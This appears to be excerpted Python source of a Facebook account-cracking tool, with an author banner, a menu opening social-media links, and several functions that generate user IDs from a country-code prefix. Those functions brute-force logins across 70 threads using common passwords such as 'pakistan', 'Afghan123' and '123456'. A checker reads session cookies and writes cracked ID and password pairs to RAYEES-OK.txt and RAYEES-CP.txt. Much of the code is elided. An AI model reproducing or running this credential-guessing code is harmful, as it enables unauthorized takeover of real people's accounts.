...
os.system('xdg-openhttps://www.facebook.com/profile.php?id=100081150990540')
...
##     ## ##     ## ##     ## ########  #### 
  ...
  ─────────────────────────────────────────────────    
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 \033[1;34m┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMAHDI          
 ...
 \033[1;34m┃ [✓] GITHUB    \033[1;91m: \033[1;92mERROR  
 \033[1;34m┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mMahdi Hussini
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open https://t.me.@RAYEES_494')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081150990540');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan1234','kabul123','100200']
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','MAHDIMAHDI','MAHDI123','malik123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MALIK123','pakistan','MAHDIMAHDI','MAHDI123','MAHDI12345','123456','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RAYEES-OK] '+cid+'|'+ps+'\033[0;97m')
                open('RAYEES-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[RAYEES-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('RAYEES-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRAYEES-MAHDI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
